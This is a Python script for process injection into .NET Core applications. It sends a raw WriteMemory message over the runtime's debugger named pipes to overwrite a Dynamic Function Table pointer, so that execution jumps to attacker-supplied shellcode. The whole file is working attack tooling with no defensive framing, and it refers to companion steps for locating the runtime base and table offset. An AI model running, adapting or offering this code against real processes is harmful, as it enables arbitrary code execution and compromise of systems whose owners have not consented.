#!/usr/bin/env python3
"""Inject code via Dynamic Function Table (DFT) in .NET Core.

This script overwrites a function pointer in the DFT to redirect
execution to shellcode.

Usage: python3 inject_dft.py <pipe_in> <pipe_out> <shellcode_address> [dft_offset]
"""

import struct
import sys

MT_WriteMemory = 0x00000003

def build_message_header(msg_type, data_block_size, msg_id, reply_id=0, last_seen_id=0):
    """Build a MessageHeader struct."""
    header = struct.pack('<IIIIII',
        msg_type,
        data_block_size,
        msg_id,
        reply_id,
        last_seen_id,
        0
    )
    header += b'\x00' * 8
    return header

def write_memory(pipe_in, pipe_out, address, data, msg_id=5):
    """Write memory to a .NET process."""
    
    length = len(data)
    data_block = struct.pack('<QQ', address, length)
    header = build_message_header(
        MT_WriteMemory,
        len(data_block) + length,
        msg_id,
        0,
        msg_id - 1
    )
    
    try:
        with open(pipe_in, 'wb') as f:
            f.write(header)
            f.write(data_block)
            f.write(data)
        
        with open(pipe_out, 'rb') as f:
            f.read(48)
        
        return True
    except Exception as e:
        print(f"[!] Write error: {e}")
        return False

def inject_dft(pipe_in, pipe_out, shellcode_addr, dft_base, dft_offset=0):
    """Inject via DFT by overwriting a function pointer."""
    
    print(f"[*] DFT Injection")
    print(f"[*] DFT Base: 0x{dft_base:016X}")
    print(f"[*] DFT Offset: 0x{dft_offset:08X}")
    print(f"[*] Shellcode: 0x{shellcode_addr:016X}")
    
    # Calculate DFT pointer address
    dft_ptr_addr = dft_base + dft_offset
    print(f"[*] Target pointer: 0x{dft_ptr_addr:016X}")
    
    # Prepare shellcode address (8 bytes for x64)
    shellcode_ptr = struct.pack('<Q', shellcode_addr)
    
    # Overwrite the function pointer
    print(f"[*] Overwriting function pointer...")
    success = write_memory(pipe_in, pipe_out, dft_ptr_addr, shellcode_ptr, 5)
    
    if success:
        print("[+] DFT injection complete!")
        print("[*] Next time the hijacked function is called, shellcode will execute")
        return True
    else:
        print("[!] DFT injection failed")
        return False

def main():
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <pipe_in> <pipe_out> <shellcode_addr> [dft_base] [dft_offset]")
        print("\nExample:")
        print(f"  {sys.argv[0]} /tmp/dotnet_debug_12345-in /tmp/dotnet_debug_12345-out 0x7fff5fbff000 0x100000000 0x12345")
        print("\nNote: Use get_dcb.py first to find libcorclr.dll base address")
        print("Then use signature hunting to find _hlpDynamicFuncTable offset")
        sys.exit(1)
    
    pipe_in = sys.argv[1]
    pipe_out = sys.argv[2]
    shellcode_addr = int(sys.argv[3], 16) if sys.argv[3].startswith('0x') else int(sys.argv[3])
    
    if len(sys.argv) >= 5:
        dft_base = int(sys.argv[4], 16) if sys.argv[4].startswith('0x') else int(sys.argv[4])
        dft_offset = int(sys.argv[5], 16) if len(sys.argv) > 5 and sys.argv[5].startswith('0x') else (int(sys.argv[5]) if len(sys.argv) > 5 else 0)
    else:
        print("[!] DFT base address required")
        print("[*] Run get_dcb.py first to obtain libcorclr.dll base address")
        sys.exit(1)
    
    inject_dft(pipe_in, pipe_out, shellcode_addr, dft_base, dft_offset)

if __name__ == "__main__":
    main()
